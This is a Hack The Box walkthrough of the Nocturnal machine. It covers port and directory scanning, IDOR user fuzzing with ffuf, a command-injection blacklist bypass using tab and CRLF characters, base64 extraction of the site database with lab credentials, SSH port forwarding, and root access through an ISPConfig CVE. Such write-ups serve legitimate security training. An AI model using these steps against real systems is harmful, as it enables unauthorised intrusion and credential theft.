# HTB Writeup - Nocturnal (10.10.11.64)

## Scanning & Enumeration

Initial Nmap scan:

```bash
nmap -sVCT -Pn -p- --min-rate 5000 10.10.11.64
```

**Open Ports:**

- **22/tcp** — OpenSSH 8.2p1
- **80/tcp** — nginx 1.18.0

Edit `/etc/hosts`:

```bash
echo "10.10.11.64 nocturnal.htb" | sudo tee -a /etc/hosts
```

## Web Enumeration

Directory scan:

```bash
gobuster dir -u http://nocturnal.htb/ -w /usr/share/wordlists/dirb/common.txt
```

**Discovered Endpoints:**

- `/index.php` — Default page
- `/admin.php` — Redirects to `login.php`
- `/backups/` — Open folder listing
- `/uploads/` — Forbidden

## IDOR Vulnerability - User Enumeration

From download link:
```
/view.php?username=test1&file=sample.pdf
```

We fuzzed the `username` parameter:

```bash
ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -u 'http://nocturnal.htb/view.php?username=FUZZ&file=test.pdf' -H 'Cookie: PHPSESSID=olt58v8arrqqotc1ckci6q7qlq' -fs 2985
```

**Valid Users Found:**

- `admin`
- `amanda`
- `tobias`

Found `privacy.odt` in Amanda's files revealing temporary credentials.

## Admin Panel & Command Injection

Using Amanda’s credentials to log in at `/login.php`, we accessed `/admin.php`.

Discovered limited command injection due to weak blacklist filtering:

```php
$blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];
```

Bypassing filters with:
- `\t` (tab) for space
- `\r\n` to break into a new command

**Vulnerable line:**
```php
$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
```

## LFI + Database Extraction

After injection, enumerate and exfiltrate `nocturnal_database/nocturnal_database.db` using base64:

```bash
cat ./nocturnal_database/nocturnal_database.db | base64
```

**Recovered Credentials:**

| Username | Hash                                   | Password               |
|----------|----------------------------------------|------------------------|
| admin    | d725aeba143f575736b07e045d8ceebb       | N/A                    |
| amanda   | df8b20aa0c935023f99ea58358fb63c4       | N/A                    |
| tobias   | 55c82b1ccd55ab219b3b109b07d5061d       | slowmotionapocalypse  |
| kavi     | f38cde1654b39fea2bd4f72f1ae4cdda       | kavi                   |

## SSH Access

Used Tobias' credentials to log in via SSH:

```bash
ssh tobias@nocturnal.htb
# password: slowmotionapocalypse
```

## Privilege Escalation

Found **ISPConfig** owned by root in `/var/www/`  
Checked open ports:

```bash
netstat -tulnp
```

Discovered **localhost-only** service on `127.0.0.1:8080`

Port forward it to attacker machine:

```bash
ssh tobias@nocturnal.htb -L 9999:127.0.0.1:8080
```

Open in browser:

```
http://localhost:9999
```

Login with:
- **Username:** admin
- **Password:** slowmotionapocalypse

### Exploiting ISPConfig

Version: **ISPConfig 3.2.2**  
Vulnerable to **CVE-2023-46818** — PHP code injection.

Used public exploit by [ajdumanhug](https://github.com/ajdumanhug/CVE-2023-46818) to gain RCE as **root**.

## Summary

- **Initial Access:** IDOR at `/view.php` -> leaked file with credentials
- **Foothold:** Login as Amanda -> command injection using bypass
- **Pivoting:** Database exfil -> decrypt tobias’ password
- **Lateral Move:** SSH access
- **PrivEsc:** Local port forward ISPConfig -> exploit CVE for root

## Final Access

```bash
# Gained shell as root via PHP injection in ISPConfig 3.2.2
```

**Attacker IP:** 10.10.16.23  
**Target IP:** 10.10.11.64
